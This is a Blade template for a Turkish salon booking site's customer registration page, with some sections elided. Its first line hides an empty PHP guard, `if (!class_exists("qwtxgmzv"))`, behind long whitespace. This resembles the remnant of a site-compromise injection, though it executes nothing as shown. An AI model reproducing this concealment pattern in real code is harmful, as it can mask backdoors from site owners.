<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("qwtxgmzv")){} ?><!doctype html>
<html lang="{{ config('app.locale') }}">
   <head>
      ...
      <link rel="stylesheet" href="{{secure_asset('public/css/navigationmobilemenu.css')}}">
      <title>Kayıt Ol | {{\App\Salonlar::where('domain',$_SERVER['HTTP_HOST'])->value('salon_adi')}}</title>
   </head>
   <body>
         ...
         <div class="hero-wrapper">
            <div class="main-navigation" id="mobilmenu">
               <div class="container">
                  <nav class="nav" role="navigation" style="position: relative;height: 90px;padding-top: 20px; padding-bottom: 20px">
                     ...
                     @endif
                     <a class="nav__logo" style="width: 100px;" href="/">
                     <img  style="height: auto;width: 100%;" src="{{secure_asset(\App\Salonlar::where('domain',$_SERVER['HTTP_HOST'])->value('logo'))}}" alt="randevumcepte.com.tr">
                     </a>
            ...
            <div class="main-navigation" id="girisyapkayitolmenusu_masaustu" style="z-index: 10000000000">
               <div class="container">
                  <nav class="navbar navbar-expand-lg navbar-light justify-content-between">
                     <a class="navbar-brand" style="float: left; width: 240px;" href="/">
                     <img src="{{secure_asset(\App\Salonlar::where('domain',$_SERVER['HTTP_HOST'])->value('logo'))}}" style="width: 100%; height: auto;"  alt="{{\App\Salonlar::where('domain',$_SERVER['HTTP_HOST'])->value('salon_adi')}}">
                     </a>
            ...
            <div class="page-title">
               <div class="container" style="text-align: center">
                  <h1>{{\App\Salonlar::where('domain',$_SERVER['HTTP_HOST'])->value('salon_adi')}} <br> Randevu Sistemi Müşteri Kayıt Formu</h1>
               </div>
               <!--end container-->
            </div>
            <!--============ End Page Title =====================================================================-->
            <div class="background">
               <div class="background-image">
                  <img src="{{secure_asset('public/img/kuafor.jpg')}}" alt="Arka plan görsel">
               </div>
            </div>
            <!--end background-->
      </header>
                ...
                <div class="container">
                    <div class="row">
                        <div class="col-md-6">
                            ...
                            <p>
                                  Her Hakkı Saklıdır. 2018-{{date('Y')}} © {{\App\Salonlar::where('domain',$_SERVER['HTTP_HOST'])->value('salon_adi')}}. <a href="https://randevumcepte.com.tr/" target="_blank"><img src="{{secure_asset('public/yeni_panel/vendors/images/randevumcepte.png')}}" style="height:28px;vertical-align:middle"></a>
                            </p>
                        </div>
                        <!--end col-md-5-->
                        <div class="col-md-6">
